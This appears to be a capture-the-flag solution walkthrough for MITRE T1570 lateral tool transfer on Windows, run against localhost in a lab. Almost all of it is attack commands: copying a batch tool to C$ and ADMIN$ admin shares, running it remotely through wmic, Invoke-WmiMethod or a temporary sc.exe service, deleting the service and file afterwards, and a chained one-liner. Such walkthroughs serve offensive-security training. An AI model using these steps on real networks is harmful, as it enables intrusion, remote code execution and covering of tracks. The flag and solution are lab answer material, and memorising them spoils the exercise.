# T1570 – Lateral Tool Transfer via SMB | Solution Walkthrough
**Difficulty:** Intermediate | **OS:** Windows | **MITRE:** T1570

## Step 1 – Copy Tool via SMB Admin Share
```cmd
REM Copy to remote host's C$ (using admin creds):
copy C:\ProgramData\attacker_tools\recon.bat \\localhost\C$\Windows\Temp\recon.bat
REM Verify:
dir \\localhost\C$\Windows\Temp\recon.bat
```

## Step 2 – Execute via WMI
```powershell
wmic process call create "cmd.exe /c C:\Windows\Temp\recon.bat"
# Or via Invoke-WmiMethod:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c C:\Windows\Temp\recon.bat"
```

## Step 3 – Execute via sc.exe (One-Shot Service)
```cmd
sc create TempExec binpath= "cmd.exe /c C:\Windows\Temp\recon.bat"
sc start TempExec
sc delete TempExec
```

## Step 4 – Retrieve Flag & Cleanup
```powershell
Get-Content "C:\Users\Public\tool_output.txt"
# HACKTIFY{LATERAL_TOOL_SMB_<hostname>}
Remove-Item "C:\Windows\Temp\recon.bat"
```

## Combined One-Liner
```cmd
copy C:\ProgramData\attacker_tools\recon.bat \\localhost\ADMIN$\recon.bat && sc \\localhost create x binpath= "cmd /c C:\Windows\recon.bat" && sc \\localhost start x && sc \\localhost delete x
```
